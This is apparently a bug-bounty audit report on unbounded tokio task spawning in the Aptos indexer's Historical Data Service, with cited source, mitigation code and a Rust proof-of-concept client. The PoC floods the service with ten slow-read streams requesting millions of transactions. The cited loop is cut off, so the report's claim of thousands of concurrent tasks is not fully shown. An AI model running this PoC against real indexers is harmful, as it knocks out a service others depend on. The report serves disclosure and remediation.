# Audit Report

## Title
Unbounded Tokio Task Spawning in Historical Data Service Enables DoS via Task Queue Saturation

## Summary
The indexer gRPC Historical Data Service spawns unbounded tokio tasks when processing transaction batch requests. An attacker can craft GetTransactionsRequest messages with large `transactions_count` values, causing each request to spawn hundreds or thousands of concurrent tokio tasks for file fetching operations. This saturates the tokio runtime's task queue, preventing legitimate indexer queries from being processed and causing service unavailability.

## Finding Description

The vulnerability exists in the request handling flow of the Historical Data Service:

**Step 1: Request Handling Setup**
The service creates a handler channel with a fixed capacity of 10 to queue incoming requests: [1](#0-0) 

**Step 2: Request Processing**
When a GetTransactionsRequest arrives, it's forwarded to the handler, which spawns a streaming task for each request: [2](#0-1) 

**Step 3: Unbounded Task Spawning**
Inside each streaming task's processing loop, a **new tokio task is spawned for every batch iteration**: [3](#0-2) 

The loop continues until `next_version >= ending_version`, where `ending_version` is determined by client-controlled input: [4](#0-3) [5](#0-4) 

**Attack Execution:**
1. Attacker sends 10 concurrent GetTransactionsRequest messages (filling the handler channel capacity)
2. Each request specifies: `starting_version=0`, `transactions_count=10000000` (or larger)
3. Each of the 10 requests spawns a streaming task via `scope.spawn`
4. Each streaming task enters a loop that iterates millions of times
5. **Each loop iteration spawns a new tokio task** via `tokio::spawn` for file fetching
6. Within minutes, thousands of tokio tasks accumulate in the runtime's queue
7. The tokio runtime becomes saturated, unable to schedule new tasks for legitimate requests
8. All subsequent indexer queries hang or timeout

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." There is no limit on the number of concurrent tasks spawned per request.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program criteria:
- **API crashes**: The indexer gRPC service becomes unresponsive and cannot serve queries
- **Validator node slowdowns**: If indexers run co-located with validators (common in infrastructure setups), the tokio runtime saturation affects the entire node

The impact includes:
- Complete denial of service for the indexer API
- Inability for users, dApps, and infrastructure to query historical blockchain data
- Potential cascading failures in systems that depend on indexer availability
- Resource exhaustion on the host machine (memory for task state, CPU for context switching)

Unlike traditional network-level DoS (which is out of scope), this is an **application-level resource exhaustion** vulnerability caused by unbounded task spawning logic.

## Likelihood Explanation

This vulnerability is **highly likely** to be exploited:

**Attacker Requirements:**
- Ability to send gRPC requests to the indexer service (no authentication required on public endpoints)
- Knowledge of the GetTransactionsRequest API (publicly documented)
- Minimal computational resources to send 10 concurrent requests

**Exploitation Complexity:** 
- Very low - requires only standard gRPC client tools
- No special timing, race conditions, or cryptographic operations needed
- Trivial to script and automate

**Detection Difficulty:**
- The attack appears as legitimate historical data queries
- No anomalous request patterns required (just large version ranges, which are valid use cases)
- Difficult to distinguish from legitimate bulk data retrieval

## Recommendation

Implement **concurrency limits** at multiple levels:

**1. Per-Stream Task Limit:**
Add a semaphore to limit concurrent file-fetching tasks per streaming request:

```rust
// In HistoricalDataService struct, add:
const MAX_CONCURRENT_FILE_FETCHES: usize = 5;

// In start_streaming, create a semaphore:
let semaphore = Arc::new(tokio::sync::Semaphore::new(MAX_CONCURRENT_FILE_FETCHES));

// Before spawning file fetch task:
let permit = semaphore.clone().acquire_owned().await.unwrap();
tokio::spawn(async move {
    let _permit = permit; // Hold permit for task lifetime
    file_store_reader.get_transaction_batch(...).await;
});
```

**2. Global Service-Level Limit:**
Add configuration for maximum concurrent streaming tasks: [6](#0-5) 

Add field: `max_concurrent_streams: usize` with default value 50, and enforce it when spawning streaming tasks.

**3. Request Validation:**
Add validation to reject unreasonably large `transactions_count` values:

```rust
const MAX_TRANSACTIONS_PER_REQUEST: u64 = 1_000_000;
if let Some(count) = request.transactions_count {
    if count > MAX_TRANSACTIONS_PER_REQUEST {
        return Err(Status::invalid_argument("transactions_count exceeds maximum allowed"));
    }
}
```

## Proof of Concept

```rust
// PoC: Malicious gRPC client that triggers task saturation
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest,
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let mut client = DataServiceClient::connect("http://[target-indexer]:50051").await?;
    
    // Spawn 10 concurrent malicious requests
    let mut handles = vec![];
    for i in 0..10 {
        let mut client = client.clone();
        let handle = tokio::spawn(async move {
            let request = GetTransactionsRequest {
                starting_version: Some(0),
                transactions_count: Some(10_000_000), // Request 10M transactions
                batch_size: Some(1000),
                transaction_filter: None,
            };
            
            let mut stream = client
                .get_transactions(Request::new(request))
                .await
                .expect("Failed to start stream")
                .into_inner();
            
            // Keep connection alive, slowly consuming responses
            while let Some(_response) = stream.message().await.expect("Stream error") {
                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
            }
        });
        handles.push(handle);
    }
    
    // Wait for tasks (they'll run until service crashes)
    futures::future::join_all(handles).await;
    Ok(())
}
```

**Expected Result:** 
Within 1-2 minutes, the indexer service becomes unresponsive. Monitoring `tokio::runtime::metrics()` would show thousands of active tasks, and subsequent legitimate queries will timeout.

**Notes**

This vulnerability is specific to the **Historical Data Service** implementation. The Live Data Service does not exhibit the same issue as it does not spawn additional tokio tasks within its streaming loop: [7](#0-6) 

The issue stems from the architectural decision to spawn a separate task for each batch file fetch operation without any concurrency control, combined with the unbounded loop controlled by client-provided `transactions_count` values. This creates an amplification factor where a single malicious request can spawn hundreds of tasks.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L78-81)
```rust
pub struct HistoricalDataServiceConfig {
    pub enabled: bool,
    pub file_store_config: IndexerGrpcFileStoreConfig,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L173-173)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L108-110)
```rust
                let ending_version = request
                    .transactions_count
                    .map(|count| starting_version + count);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L112-123)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L149-180)
```rust
        let ending_version = ending_version.unwrap_or(u64::MAX);
        let mut size_bytes = 0;
        'out: loop {
            self.connection_manager
                .update_stream_progress(&id, next_version, size_bytes);
            if next_version >= ending_version {
                break;
            }

            if !self.file_store_reader.can_serve(next_version).await {
                info!(stream_id = id, "next_version {next_version} is larger or equal than file store version, terminate the stream.");
                break;
            }

            // TODO(grao): Pick a better channel size here, and consider doing parallel fetching
            // inside the `get_transaction_batch` call based on the channel size.
            let (tx, mut rx) = channel(1);

            let file_store_reader = self.file_store_reader.clone();
            let filter = filter.clone();
            tokio::spawn(async move {
                file_store_reader
                    .get_transaction_batch(
                        next_version,
                        /*retries=*/ 3,
                        /*max_files=*/ None,
                        filter,
                        Some(ending_version),
                        tx,
                    )
                    .await;
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```
